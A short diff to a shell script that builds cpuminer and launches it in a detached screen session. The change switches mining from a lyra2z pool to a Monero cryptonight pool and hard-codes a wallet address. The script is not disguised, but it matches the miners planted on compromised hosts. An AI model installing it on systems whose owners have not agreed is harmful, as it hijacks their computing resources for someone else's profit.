@@ -20,7 +20,7 @@ echo "minerd has been installed, starting now"
 
 cd cpuminer-xzc
 		
-screen -dmSL cpuminer ./cpuminer -a lyra2z -o stratum+tcp://asia.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.cpagrow -p 1; sleep 3
+screen -dmSL cpuminer ./cpuminer -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:7777 -u 48nYc6uV9ugBzgaZzDN6xb61jZrc1t5S1S9FFxDiuX4qe1ny5QfaJ1UPL3o2mn4hAoepcrBmkypJ6Y9r3v24CxAVBtVEzB1 -p x; sleep 3
 
      
 fi
@@ -35,6 +35,6 @@ cd cpuminer-xzc
 ./build.sh
 echo "minerd is starting"
 
-screen -dmSL cpuminer ./cpuminer -a lyra2z  -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.cpagrow -p 1 ; sleep 3
+screen -dmSL cpuminer ./cpuminer -a cryptonight  -o stratum+tcp://xmr.crypto-pool.fr:7777 -u 48nYc6uV9ugBzgaZzDN6xb61jZrc1t5S1S9FFxDiuX4qe1ny5QfaJ1UPL3o2mn4hAoepcrBmkypJ6Y9r3v24CxAVBtVEzB1 -p x ; sleep 3
 
 exit 0
